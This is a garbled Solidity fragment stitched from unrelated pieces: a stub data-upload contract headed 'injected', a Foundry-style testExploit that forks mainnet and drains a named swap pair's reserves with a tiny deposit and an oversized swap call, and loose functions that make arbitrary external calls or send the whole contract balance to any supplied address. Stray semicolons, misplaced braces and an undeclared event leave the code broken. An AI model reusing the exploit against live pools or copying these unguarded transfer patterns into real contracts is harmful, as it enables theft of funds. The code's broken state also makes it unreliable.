
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function uploadData(string memory dataId, string memory metadata) public {
        require(bytes(dataId).length > 0, "Invalid data ID");
        emit DataUploaded(msg.sender, dataId);
    }
}
pragma solidity ^0.8.10;

;
;
interface SWAPOS {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool)};
interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address guy, uint256 wad) external returns (bool);
    function withdraw(uint256 wad) external;
    function balanceOf(address) external view returns (uint256)};
contract ContractTest is Test {
    SWAPOS swpToken = SWAPOS(0x09176F68003c06F190ECdF40890E3324a9589557);
    IWETH private constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    SWAPOS swapPos = SWAPOS(0x8ce2F9286F50FbE2464BFd881FAb8eFFc8Dc584f);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork("mainnet", 17057419);
        cheats.label(address(WETH), "weth");
        cheats.label(address(swpToken), "swpToken")};
    function testExploit() external {
        WETH.deposit{value: 3 ether}();
        WETH.transfer(address(swapPos), 10);
        swapPos.swap(142658161144708222114663 ,0, address(this), "");
        (uint _reserve0, uint _reserve1, uint32 _blockTimestampLast) = swapPos.getReserves();
        emit log_named_decimal_uint("swapos balance", _reserve0, 18);
        emit log_named_decimal_uint("ETH balance", _reserve1, 18)}
function duplicateSubmission(bytes memory signedData) public {
    externalContract.call(signedData)}
function unsafeTransfer(address to) public {
    to.call{value: address(this).balance}("")}